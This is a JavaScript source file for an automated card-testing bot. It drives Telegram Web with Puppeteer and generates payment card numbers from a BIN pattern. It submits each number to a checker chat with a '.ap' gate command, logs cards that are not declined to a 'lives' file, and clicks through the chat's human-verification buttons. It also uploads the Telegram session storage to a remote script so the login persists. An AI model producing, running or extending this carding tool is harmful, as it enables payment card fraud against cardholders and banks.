import puppeteer from 'puppeteer';

// Or import puppeteer from 'puppeteer-core';
import express from "express";
import { readFile, writeFile } from 'node:fs/promises';
import path from "path";
import fetch from "node-fetch";
import { generateCardFromString } from "./GenCard.js";
import { resolve } from 'node:path';


const bins = ["478200207155xxxx|10|2028|rnd"];
var gate = ".ap";
var checking = [];

const app = express()
const port = 3000;
var qrSaved = false;
var logged = false;
var chat_id = "#-4522668839"
var regexCard = /\d{16,}\|(\d{1}|\d{2})\|(\d{2}|\d{4})\|(\d{3,4})/g;

var maxCurrent = 2;


// Launch the browser and open a new blank page
const browser = await puppeteer.launch({
  headless: false, defaultViewport: null,
  args: ['--start-maximized']
});
const defaultBrowserContext = browser.defaultBrowserContext();
const pages = await defaultBrowserContext.pages();
const page1 = pages[0]; // Seleccionar la primera pestaña (la pestaña que se abre al abrir el navegador)

await page1.goto('https://web.telegram.org/a/');

var localStorageFileId = "1YRuKQGSbu7Hg-kDHVNqfeOS2wi1RmGjE";
var ftpServerUrl = "https://script.google.com/macros/s/AKfycbz9GV4R7FOQOoTukIl8RDmdqw_sOy00z8H1IJDgA8dCQIMCbxO031VFF4TbwjSqBf0PIg/exec";

var localStorageJSON = await fetch("https://drive.google.com/uc?id=" + localStorageFileId)
  .then(response => response.text())
  .catch(error => {
    console.error('Error:', error)
    return "";
  });
if (localStorageJSON !== "") {

  var localStorageObject = JSON.parse(localStorageJSON);
  await page1.evaluate((localStorageJSON) => {
    Object.keys(localStorageJSON).forEach(key => {
      window.localStorage.setItem(key, localStorageJSON[key]);
    });
  }, localStorageObject);
}
var page = await browser.newPage();
page1.close();
// Navigate the page to a URL.
await page.goto('https://web.telegram.org/a/' + chat_id);


page.on('dialog', async (dialog) => {
  await dialog.accept();
});

// Set screen size.

function antibot() {
  return new Promise(async (resolve) => {

    var classForAntibotButton = "antibot-button";
    var antibotBtnArrayLength = await page.evaluate((classForAntibotButton) => {
      var antibotBtnArray = Array.from(document.querySelectorAll("div > div.message-content-wrapper.can-select-text > div.InlineButtons > div > button")).filter(e => e.innerText === 'Soy Humano ');
      if (antibotBtnArray.length > 0) {
        for (let i = 0; i < antibotBtnArray.length; i++) {
          antibotBtnArray[i].classList.add(classForAntibotButton + "-" + i);
        }
        return antibotBtnArray.length;
      } else {
        return null
      }
    }, classForAntibotButton);

    if (antibotBtnArrayLength) {
      for (let i = 0; i < antibotBtnArrayLength; i++) {
        await page.click("." + classForAntibotButton + "-" + i);
        console.log("se dio click a: " + i);
      }
      var page1 =await browser.newPage();
      await page.close();
      page = page1;
      await page.goto('https://web.telegram.org/a/' + chat_id);
    }
    resolve(classForAntibotButton);
  
  })
}

/* MANEJAR TARJETAS */
setTimeout(interval, 10_000);
var queue = [];
  var ejecucion=1;
  async function interval() {
    console.log(ejecucion++);
    const startTime = Date.now();
    const maxTime = 1000; // límite inferior para el tiempo transcurrido

    
    await antibot();

    var cardsStatuses = await getCardsStatuses();
    console.log(cardsStatuses)
   
    for (let i = cardsStatuses.length - 1; i >= 0; i--) {
      //console.log(i+1)
      
      if (cardsStatuses[i].live) {
        var fileContent = await readFile(resolve("./lives.json"))
        var liveCards = JSON.parse(fileContent);
        if (!liveCards.find(e => e.card === cardsStatuses[i].card)) {
          liveCards.push(cardsStatuses[i]);
          await writeFile(resolve("./lives.json"), JSON.stringify(liveCards))
        }
      }
      if (queue.includes(cardsStatuses[i].card)) {
        console.log("se encontro y se borrará :", cardsStatuses[i].card, " con index "+queue.indexOf(cardsStatuses[i].card))
        //console.log(cardsStatuses[i])
        queue.splice(queue.indexOf(cardsStatuses[i].card), 1)
      }
    }
  
  
    var cupos = maxCurrent - queue.length;
  
    while (cupos>0) {
      console.log("cupos: ",cupos)
      var card = generateCardFromString(bins[0]);
      console.log(card)
      queue.push(card);
      if(card)await sendCardToCheck(card);
      cupos--;
    }


    
    const endTime = Date.now();
    const timeElapsed = endTime - startTime;
  
    if (timeElapsed >= maxTime) {
      // llamar a la función interval de manera recursiva
      interval();
    } else {
      // establecer un intervalo de tiempo fijo antes de llamar a la función interval de manera recursiva
      setTimeout(interval, maxTime - timeElapsed);
    }
  }
/* async function interval() {
  console.log("ejecucion: ", ejecucion++)
  var startTime = Date.now();

  await antibot();

  var cardsStatuses = await getCardsStatuses();

 
  for (let i = cardsStatuses.length - 1; i >= 0; i--) {
    //console.log(i+1)
    
    if (cardsStatuses[i].live) {
      var fileContent = await readFile(resolve("./lives.json"))
      var liveCards = JSON.parse(fileContent);
      if (!liveCards.find(e => e.card === cardsStatuses[i].card)) {
        liveCards.push(cardsStatuses[i]);
        await writeFile(resolve("./lives.json"), JSON.stringify(liveCards))
      }
    }
    if (queue.includes(cardsStatuses[i].card)) {
      console.log("se encontro y se borrará :", cardsStatuses[i].card, " con index "+queue.indexOf(cardsStatuses[i].card))
      //console.log(cardsStatuses[i])
      queue.splice(queue.indexOf(cardsStatuses[i].card), 1)
    }
  }


  var cupos = maxCurrent - queue.length;

  while (cupos>0) {
    console.log("cupos: ",cupos)
    var card = generateCardFromString(bins[0]);
    console.log(card)
    queue.push(card);
    if(card)await sendCardToCheck(card);
    cupos--;
  }

  var restante = Date.now() - startTime;
  if(restante>=1000)interval();
  else setTimeout(interval, restante)
  

} */
 

async function getCardsStatuses() {
  return page.evaluate(() => {
    var regexCard = /\d{16,}\|(\d{1}|\d{2})\|(\d{2}|\d{4})\|(\d{3,4})/g;
    return Array.from(document.querySelectorAll("div.text-content.clearfix.with-meta")).filter(e => regexCard.test(e.innerText) && e.innerText.includes("Status ➜")).map(ele => {
      var ob={
        live: ele.innerText.includes("Declined!") ? false : true,
        card: ele.innerText.match(regexCard)[0]
      }
      return ob;
    })
  })

  /* return Array.from(document.querySelectorAll(".text-content.clearfix.with-meta")).filter(e=>regexCard.test(e.innerText) && e.innerText.includes("Status ➜")).map(e=>{
      return{
          live: e.innerText.includes("Declined!") ?false:true,
          card: e.innerText.match(regexCard)[0]
      }
    }) */
}
async function sendCardToCheck(card) {
 // await page.focus('#editable-message-text');
  await page.type('#editable-message-text', `${gate} ${card}`);
  await new Promise(r=>setTimeout(() => {
    r(true)
  }, 1000))
  await page.click("#MiddleColumn > div.messages-layout > div.Transition > div > div.middle-column-footer > div.Composer.shown.mounted > button");
  await new Promise(r=>setTimeout(() => {
    r(true)
  }, 1000))
}

function getCheckingCards() {
  return page.evaluate(
    (regexCard) => {
      return Array.from(document.querySelectorAll(".text-content.clearfix.with-meta"))
        .filter(e => e.innerText.includes("[Status] Loading ..."))
        .map(e => e.innerText.match(regexCard)[0])
    },
    regexCard)
}

// Escuchar eventos de solicitud de HTTP


// Escuchar eventos de respuesta de HTTP
page.on('requestfinished', (request) => {
  if (request.url().startsWith('https://web.telegram.org/a/blank') && logged == false) {
    console.log(request.url())
    if (
      localStorageJSON === ""
    ) { updateQr() }

  }
  if (request.url().startsWith('https://web.telegram.org/a/BundleMain.') && request.url().endsWith('.css')) {
    console.log(request.url())
    console.log('Sesión iniciada')
    if (localStorageJSON === "") {
      page.waitForSelector("#LeftColumn-main > div.NewChatButton > button")
        .then(() => {
          page.evaluate(() => {
            return JSON.stringify(window.localStorage);
          })
            .then((localStorageJSON) => {
              /* fs.writeFileSync('localStorage.json', localStorageJSON);
              console.log("localStorage.json was saved") */

              uploadLocalStorageFile(localStorageJSON)
                .then(() => console.log("localStorage file uploaded"))
                .catch(error => console.log(error))

            })
        })
        .catch(error => console.log(error))
    }
    logged = true;
  }
});



app.get('/qr', (req, res) => {
  if (logged) {
    res.send('Sesión iniciada')
  }
  else if (!qrSaved) {
    res.send('qr not saved yet');
  }
  else {
    res.sendFile(path.resolve('./qr.png'));
  }

})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})



export async function updateQr() {
  var qrSelector = await page.waitForSelector(".qr-container");
  qrSelector.screenshot().then(buffer => {
    fs.writeFileSync('qr.png', buffer);
    console.log("QR code screenshot saved to qr.png");
    qrSaved = true;
  })
    .catch(error => console.log(error))
}


function uploadLocalStorageFile(localStorageJsonContent) {
  return fetch(ftpServerUrl, {
    "body": JSON.stringify({ "archivo_name": "localStorage.json", "file_mime": "application/json", "archivo_base64": btoa(localStorageJsonContent), "file_id": localStorageFileId }),
    "method": "POST"
  });
}


